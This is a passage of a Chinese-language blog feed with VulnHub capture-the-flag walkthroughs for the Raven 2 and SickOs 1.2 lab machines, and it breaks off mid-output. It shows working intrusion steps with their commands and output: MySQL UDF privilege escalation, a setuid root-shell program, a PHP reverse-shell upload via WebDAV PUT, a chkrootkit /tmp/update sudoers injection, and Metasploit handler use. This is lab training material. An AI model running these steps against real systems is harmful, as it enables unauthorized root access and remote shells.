/usr/bin/find<span class="string">&#x27;) |</span></span><br><span class="line"><span class="string">+--------------------------------------+</span></span><br><span class="line"><span class="string">|                                    0 |</span></span><br><span class="line"><span class="string">+--------------------------------------+</span></span><br><span class="line"><span class="string">1 row in set (0.00 sec)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">+--------------------------------------+</span></span><br><span class="line"><span class="string">| do_system(&#x27;</span>chmod u+s /usr/bin/find<span class="string">&#x27;) |</span></span><br><span class="line"><span class="string">+--------------------------------------+</span></span><br><span class="line"><span class="string">|                                    0 |</span></span><br><span class="line"><span class="string">+--------------------------------------+</span></span><br><span class="line"><span class="string">1 row in set (0.00 sec)</span></span><br></pre></td></tr></table></figure>

<ul>
<li>开始提权并读取最后的flag4</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Raven:/tmp$ touch lucifer11</span><br><span class="line">www-data@Raven:/tmp$ find lucifer11 -<span class="built_in">exec</span> <span class="string">&quot;whoami&quot;</span> \;</span><br><span class="line">find lucifer11 -<span class="built_in">exec</span> <span class="string">&quot;whoami&quot;</span> \;</span><br><span class="line">root</span><br><span class="line">www-data@Raven:/tmp$ find lucifer11 -<span class="built_in">exec</span> <span class="string">&quot;id&quot;</span> \;</span><br><span class="line">find lucifer11 -<span class="built_in">exec</span> <span class="string">&quot;id&quot;</span> \;</span><br><span class="line">uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)</span><br><span class="line">www-data@Raven:/tmp$ find lucifer11 -<span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span> \;</span><br><span class="line">find lucifer11 -<span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span> \;</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line"><span class="comment"># pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/tmp</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">flag4.txt</span><br><span class="line"><span class="comment"># cat flag4.txt</span></span><br><span class="line">cat flag4.txt</span><br><span class="line">  ___                   ___ ___ </span><br><span class="line"> | _ \__ ___ _____ _ _ |_ _|_ _|</span><br><span class="line"> |   / _` \ V / -_) <span class="string">&#x27; \ | | | | </span></span><br><span class="line"><span class="string"> |_|_\__,_|\_/\___|_||_|___|___|</span></span><br><span class="line"><span class="string">                           </span></span><br><span class="line"><span class="string">flag4&#123;df2bc5e951d91581467bb9a2a8ff4425&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">CONGRATULATIONS on successfully rooting RavenII</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I hope you enjoyed this second interation of the Raven VM</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Hit me up on Twitter and let me know what you thought: </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@mccannwj / wjmccann.github.io</span></span><br></pre></td></tr></table></figure>

<p>完成提权并且成功的读取到了flag4</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub222.jpg"></li>
</ul>
<ul>
<li>【提权方法3】：</li>
</ul>
<p>还是利用Mysql udf提权，只不过这次用到setuid.c</p>
<p>setuid.c</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    setuid(0); setgid(0); system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面是整个mysql语句的操作命令，步骤可以参照【提权方式2】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">create table foo(line blob);</span><br><span class="line">insert into foo values(load_file(<span class="string">&#x27;/tmp/raptor_udf2.so&#x27;</span>));</span><br><span class="line">select * from foo into dumpfile <span class="string">&#x27;/usr/lib/raptor_udf2.so&#x27;</span>;</span><br><span class="line">create <span class="keyword">function</span> do_system returns <span class="built_in">integer</span> soname <span class="string">&#x27;raptor_udf2.so&#x27;</span>;</span><br><span class="line">select * from foo into dumpfile <span class="string">&#x27;/usr/lib/mysql/plugin/raptor_udf2.so&#x27;</span>;</span><br><span class="line">create <span class="keyword">function</span> do_system returns <span class="built_in">integer</span> soname <span class="string">&#x27;raptor_udf2.so&#x27;</span>; </span><br><span class="line">select * from mysql.func;</span><br><span class="line">select do_system(<span class="string">&#x27;gcc -o /tmp/setuid /tmp/setuid.c&#x27;</span>);</span><br><span class="line">select do_system(<span class="string">&#x27;chmod u+s /tmp/setuid&#x27;</span>);</span><br><span class="line">\! sh .</span><br><span class="line">/setuid</span><br></pre></td></tr></table></figure>

<p>命令执行完成之后即拥有了root权限的shell</p>
<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
<li>PHPMailer&lt;5.2.18-远程命令执行</li>
<li>mysql5.5版本udf提权（1518.c）</li>
<li>setuid.c脚本提权</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[SickOs-1-2]</title>
    <url>/2020/03/30/SickOs-1-2/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：SickOs: 1.2<br>发布日期：2016年4月27日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9zaWNrb3Mvc2ljazBzMS4yLnppcA==">https://download.vulnhub.com/sickos/sick0s1.2.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9zaWNrb3Mvc2ljazBzMS4yLnppcC50b3JyZW50">https://download.vulnhub.com/sickos/sick0s1.2.zip.torrent<i class="fa fa-external-link-alt"></i></span> </li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Name........: SickOs1.2</span><br><span class="line">Date Release: 26 Apr 2016</span><br><span class="line">Author......: D4rk</span><br><span class="line">Series......: SickOs</span><br><span class="line">Objective...: Get /root/7d03aaa2bf93d80040f3f22ec6ad9d5a.txt</span><br><span class="line">Tester(s)...: h1tch1, Eagle11</span><br><span class="line">Twitter.....: https://twitter.com/D4rk36</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">这是SickOs后续系列中的第二篇文章，与先前的发行版无关，挑战范围是在系统上获得最高特权。</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Filename: Sick0s1.2.zip</span><br><span class="line">File size: 696.2 MB</span><br><span class="line">MD5: b013ba76f50c15890554632a40b697bd</span><br><span class="line">SHA1: 9f45f7c060e15dc6bb93c1cf39efdd75125e30a0</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Format: OVF</span><br><span class="line">Operating System: Ubuntu</span><br><span class="line">Tested on: VMWare workstation Pro 12.1.0 build-3272444</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">DHCP service: Enabled</span><br><span class="line">IP address: Automatically assign</span><br></pre></td></tr></table></figure>

<p>需要使用VMware。可能对VirtualBox有问题。如果要使用virtualbox打开的话，解决方案：打开.ovf文件，将“ElementName”的所有实例替换为“Caption”，并将“vmware.sata.ahci”替换为“AHCI”。还要删除.mf文件，然后按常规导入。</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.66.*</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.66.14</span><br><span class="line">Host is up (0.00033s latency).</span><br><span class="line">MAC Address: 00:0C:29:1B:36:86 (VMware)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -v -p- 192.168.66.14</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    lighttpd 1.4.28</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -v -p 22,80 192.168.66.14 -T4 --script=vuln</span></span><br><span class="line">22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp open  http    lighttpd 1.4.28</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /<span class="built_in">test</span>/: Test page</span><br><span class="line">|_http-server-header: lighttpd/1.4.28</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server<span class="string">&#x27;s resources causing Denial Of Service.</span></span><br><span class="line"><span class="string">|       </span></span><br><span class="line"><span class="string">|     Disclosure date: 2009-09-17</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span></span><br><span class="line"><span class="string">|_      http://ha.ckers.org/slowloris/</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| vulners: </span><br><span class="line">|   cpe:/a:lighttpd:lighttpd:1.4.28: </span><br><span class="line">|       CVE-2013-4559   7.6     https://vulners.com/cve/CVE-2013-4559</span><br><span class="line">|       CVE-2014-2323   7.5     https://vulners.com/cve/CVE-2014-2323</span><br><span class="line">|       CVE-2013-4508   5.8     https://vulners.com/cve/CVE-2013-4508</span><br><span class="line">|       CVE-2018-19052  5.0     https://vulners.com/cve/CVE-2018-19052</span><br><span class="line">|       CVE-2014-2324   5.0     https://vulners.com/cve/CVE-2014-2324</span><br><span class="line">|       CVE-2011-4362   5.0     https://vulners.com/cve/CVE-2011-4362</span><br><span class="line">|_      CVE-2013-4560   2.6     https://vulners.com/cve/CVE-2013-4560</span><br></pre></td></tr></table></figure>

<p>目录爆破一波</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.66.14/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Mon Mar 30 01:39:50 2020</span><br><span class="line">URL_BASE: http://192.168.66.14/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.66.14/ ----</span><br><span class="line">+ http://192.168.66.14/index.php (CODE:200|SIZE:163)                                                                      </span><br><span class="line">==&gt; DIRECTORY: http://192.168.66.14/<span class="built_in">test</span>/                                                                                 </span><br><span class="line">                                                                                                                          </span><br><span class="line">---- Entering directory: http://192.168.66.14/<span class="built_in">test</span>/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                               </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Mon Mar 30 01:40:02 2020</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 1</span><br></pre></td></tr></table></figure>

<p>在/test上找到目录列表，但是没有什么有趣的。我在/和/test上检查HTTP方法OPTIONS，发现/test上允许许多HTTP方法</p>
<p>request</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">OPTIONS /<span class="built_in">test</span>/ HTTP/1.1</span><br><span class="line">Host: 192.168.66.14</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>

<p>response</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">DAV: 1,2</span><br><span class="line">MS-Author-Via: DAV</span><br><span class="line">Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK</span><br><span class="line">Allow: OPTIONS, GET, HEAD, POST</span><br><span class="line">Content-Length: 0</span><br><span class="line">Connection: close</span><br><span class="line">Date: Mon, 30 Mar 2020 05:42:43 GMT</span><br><span class="line">Server: lighttpd/1.4.28</span><br></pre></td></tr></table></figure>

<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>允许HTTP方法PUT，而无需身份验证。攻击者可以使用HTTP方法PUT将Web Shell上传到/test。所以使用以下的curl方法上传php-reverse-shell.php</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/sickos<span class="comment"># curl --upload-file php-reverse-shell.php -v --url http://192.168.233.129/test/shell.php -0 --http1.0</span></span><br><span class="line">*   Trying 192.168.233.129:80...</span><br><span class="line">* TCP_NODELAY <span class="built_in">set</span></span><br><span class="line">* Connected to 192.168.233.129 (192.168.233.129) port 80 (<span class="comment">#0)</span></span><br><span class="line">&gt; PUT /<span class="built_in">test</span>/shell.php HTTP/1.0</span><br><span class="line">&gt; Host: 192.168.233.129</span><br><span class="line">&gt; User-Agent: curl/7.68.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; Content-Length: 5494</span><br><span class="line">&gt; </span><br><span class="line">* We are completely uploaded and fine</span><br><span class="line">* Mark bundle as not supporting multiuse</span><br><span class="line">* HTTP 1.0, assume close after body</span><br><span class="line">&lt; HTTP/1.0 201 Created</span><br><span class="line">&lt; Content-Length: 0</span><br><span class="line">&lt; Connection: close</span><br><span class="line">&lt; Date: Mon, 30 Mar 2020 05:50:14 GMT</span><br><span class="line">&lt; Server: lighttpd/1.4.28</span><br><span class="line">&lt; </span><br><span class="line">* Closing connection 0</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub228.jpg"></li>
</ul>
<p>可以看到成功的上传了phpreverseshell</p>
<p>kali端使用nc监听端口，并用浏览器访问shell地址，成功反弹shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -nlvp 443</span></span><br><span class="line">listening on [any] 443 ...</span><br><span class="line">connect to [192.168.233.128] from (UNKNOWN) [192.168.233.129] 48337</span><br><span class="line">Linux ubuntu 3.11.0-15-generic <span class="comment">#25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux</span></span><br><span class="line"> 23:07:02 up 8 min,  0 users,  load average: 0.03, 0.03, 0.02</span><br><span class="line">USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">$ pwd</span></span><br><span class="line"><span class="string">/</span></span><br></pre></td></tr></table></figure>

<p>尝试在TCP端口8890上进行侦听，发现没有连接到达我的侦听器，然后将侦听端口更改为443，并修改了php reverse shell，然后再次上传,才成功收到shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@ubuntu:/$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>列举操作系统版本。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/$ lsb_release -a</span><br><span class="line">lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 12.04.4 LTS</span><br><span class="line">Release:        12.04</span><br><span class="line">Codename:       precise</span><br><span class="line">www-data@ubuntu:/$ dpkg -l | grep chkrootkit</span><br><span class="line">dpkg -l | grep chkrootkit</span><br><span class="line">rc  chkrootkit                      0.49-4ubuntu1.1                   rootkit detector</span><br></pre></td></tr></table></figure>

<p>检查cron任务，发现cron.daily有chkrootkit。知道chkrootkit—<span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMzM4OTk=">CVE-2014-0476<i class="fa fa-external-link-alt"></i></span>的漏洞可能会有提升到root用户的机会。</p>
<p>脆弱的chkrootkit将执行/tmp/update，可以在/tmp contains shell命令中创建名为update的文件，该命令将sudo su添加到用户www-data</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/$ <span class="built_in">echo</span> <span class="string">&#x27;echo &quot;www-data ALL=NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers &amp;&amp; chmod 440 /etc/sudoers&#x27;</span> &gt; /tmp/update</span><br><span class="line">&lt; ALL<span class="string">&quot; &gt;&gt; /etc/sudoers &amp;&amp; chmod 440 /etc/sudoers&#x27; &gt; /tmp/update              </span></span><br><span class="line"><span class="string">www-data@ubuntu:/$</span></span><br></pre></td></tr></table></figure>

<p>然后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/tmp$ chmod 777 *</span><br><span class="line">chmod 777 *</span><br><span class="line">chmod: changing permissions of `VMwareDnD<span class="string">&#x27;: Operation not permitted</span></span><br><span class="line"><span class="string">chmod: changing permissions of `vgauthsvclog.txt.0&#x27;</span>: Operation not permitted</span><br><span class="line">chmod: changing permissions of `vmware-root<span class="string">&#x27;: Operation not permitted</span></span><br><span class="line"><span class="string">www-data@ubuntu:/tmp$ ls -la</span></span><br><span class="line"><span class="string">ls -la</span></span><br><span class="line"><span class="string">total 24</span></span><br><span class="line"><span class="string">drwxrwxrwt  4 root     root     4096 Mar 29 23:24 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 22 root     root     4096 Mar 30  2016 ..</span></span><br><span class="line"><span class="string">drwxrwxrwt  2 root     root     4096 Mar 29 22:58 VMwareDnD</span></span><br><span class="line"><span class="string">srwxrwxrwx  1 www-data www-data    0 Mar 29 22:58 php.socket-0</span></span><br><span class="line"><span class="string">-rwxrwxrwx  1 www-data www-data   76 Mar 29 23:18 update</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root     root     1600 Mar 29 22:58 vgauthsvclog.txt.0</span></span><br><span class="line"><span class="string">drwx------  2 root     root     4096 Mar 29 22:58 vmware-root</span></span><br></pre></td></tr></table></figure>

<p>然后等待几分钟</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu:/tmp<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@ubuntu:/tmp<span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">root@ubuntu:/tmp<span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">root@ubuntu:~<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">304d840d52840689e0ab0af56d6d3a18-chkrootkit-0.49.tar.gz  chkrootkit-0.49</span><br><span class="line">7d03aaa2bf93d80040f3f22ec6ad9d5a.txt                     newRule</span><br><span class="line">root@ubuntu:~<span class="comment"># cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt</span></span><br><span class="line">cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt</span><br><span class="line">WoW! If you are viewing this, You have <span class="string">&quot;Sucessfully!!&quot;</span> completed SickOs1.2, the challenge is more focused on elimination of tool <span class="keyword">in</span> real scenarios <span class="built_in">where</span> tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though <span class="keyword">while</span> developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.</span><br><span class="line"></span><br><span class="line">Thanks <span class="keyword">for</span> giving this try.</span><br><span class="line"></span><br><span class="line">@vulnhub: Thanks <span class="keyword">for</span> hosting this UP!.</span><br></pre></td></tr></table></figure>

<p>成功的获取到了root权限，并找到了flag</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub229.jpg"></li>
</ul>
<h3 id="提权2-使用msf提权"><a href="#提权2-使用msf提权" class="headerlink" title="提权2(使用msf提权)"></a>提权2(使用msf提权)</h3><p>设置msf，然后使用之前的php-reverse-shell反弹shell到nsf，然后将session会话置于后台</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfdb run</span></span><br><span class="line">[i] Database already started</span><br><span class="line">                                                  </span><br><span class="line"></span><br><span class="line">      .:okOOOkdc<span class="string">&#x27;           &#x27;</span>cdkOOOko:.                                                                                    </span><br><span class="line">    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.                                                                                  </span><br><span class="line">   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:                                                                                 </span><br><span class="line">  <span class="string">&#x27;OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO&#x27;</span>                                                                                </span><br><span class="line">  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo                                                                                </span><br><span class="line">  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx                                                                                </span><br><span class="line">  lOOOOOOOO.         ;d;         ,OOOOOOOOl                                                                                </span><br><span class="line">  .OOOOOOOO.   .;           ;    ,OOOOOOOO.                                                                                </span><br><span class="line">   cOOOOOOO.   .OOc.     <span class="string">&#x27;oOO.   ,OOOOOOOc                                                                                 </span></span><br><span class="line"><span class="string">    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo                                                                                  </span></span><br><span class="line"><span class="string">     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl                                                                                   </span></span><br><span class="line"><span class="string">      ;OOOO&#x27;</span>   .OOOO.   :OOOO.   ;OOOO;                                                                                    </span><br><span class="line">       .dOOo   .OOOOocccxOOOO.   xOOd.                                                                                     </span><br><span class="line">         ,kOl  .OOOOOOOOOOOOO. .dOk,                                                                                       </span><br><span class="line">           :kk;.OOOOOOOOOOOOO.cOk:                                                                                         </span><br><span class="line">             ;kOOOOOOOOOOOOOOOk:                                                                                           </span><br><span class="line">               ,xOOOOOOOOOOOx,                                                                                             </span><br><span class="line">                 .lOOOOOOOl.                                                                                               </span><br><span class="line">                    ,dOd,                                                                                                  </span><br><span class="line">                      .                                                                                                    </span><br><span class="line"></span><br><span class="line">       =[ metasploit v5.0.80-dev                          ]</span><br><span class="line">+ -- --=[ 1983 exploits - 1088 auxiliary - 339 post       ]</span><br><span class="line">+ -- --=[ 563 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 7 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit tip: You can use <span class="built_in">help</span> to view all available commands</span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 443</span><br><span class="line">lport =&gt; 443</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 192.168.233.128</span><br><span class="line">lhost =&gt; 192.168.233.128</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> payload linux/x86/shell_reverse_tcp</span><br><span class="line">payload =&gt; linux/x86/shell_reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.233.128:443 </span><br><span class="line">[*] Command shell session 1 opened (192.168.233.128:443 -&gt; 192.168.233.129:48340) at 2020-03-30 02:40:05 -0400</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/</span><br><span class="line">$ whoami</span><br><span class="line">www-data</span><br><span class="line">$ backgroud</span><br><span class="line">/bin/sh: 5: backgroud: not found</span><br><span class="line">$ background</span><br><span class="line"></span><br><span class="line">Background session 1? [y/N]  y</span><br><span class="line">msf5 exploit(multi/handler) &gt;</span><br></pre></td></tr></table></figure>

<p>然后，开始寻找chkroot漏洞利用程序并正确用msf配置它：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf exploit(handler) &gt; search chkroot</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                           Disclosure Date  Rank    Description</span><br><span class="line">   ----                           ---------------  ----    -----------</span><br><span class="line">   exploit/unix/<span class="built_in">local</span>/chkrootkit  2014-06-04       manual  Chkrootkit Local Privilege Escalation</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(handler) &gt; use exploit/unix/<span class="built_in">local</span>/chkrootkit</span><br><span class="line">msf exploit(chkrootkit) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/<span class="built_in">local</span>/chkrootkit):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting       Required  Description</span><br><span class="line">   ----        ---------------       --------  -----------</span><br><span class="line">   CHKROOTKIT  /usr/sbin/chkrootkit  yes       Path to chkrootkit</span><br><span class="line">   SESSION                           yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(chkrootkit) &gt; <span class="built_in">set</span> session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf exploit(chkrootkit) &gt; <span class="built_in">set</span> lport 8080</span><br><span class="line">lport =&gt; 8080</span><br></pre></td></tr></table></figure>
<p>此外还要设置lhost为192.168.233.128<br>等待返回shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 exploit(unix/<span class="built_in">local</span>/chkrootkit) &gt; <span class="built_in">set</span> LHOST 192.168.233.128</span><br><span class="line">LHOST =&gt; 192.168.233.128</span><br><span class="line">msf5 exploit(unix/<span class="built_in">local</span>/chkrootkit) &gt; run -j</span><br><span class="line">[*] Exploit running as background job 1.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP double handler on 192.168.233.128:8080 </span><br><span class="line">msf5 exploit(unix/<span class="built_in">local</span>/chkrootkit) &gt; [!] Rooting depends on the crontab (this could take a <span class="keyword">while</span>)</span><br><span class="line">[*] Payload written to /tmp/update</span><br><span class="line">[*] Waiting <span class="keyword">for</span> chkrootkit to run via cron...</span><br><span class="line">[*] Accepted the first client connection...</span><br><span class="line">[*] Accepted the second client connection...</span><br><span class="line">[*] Command: <span class="built_in">echo</span> 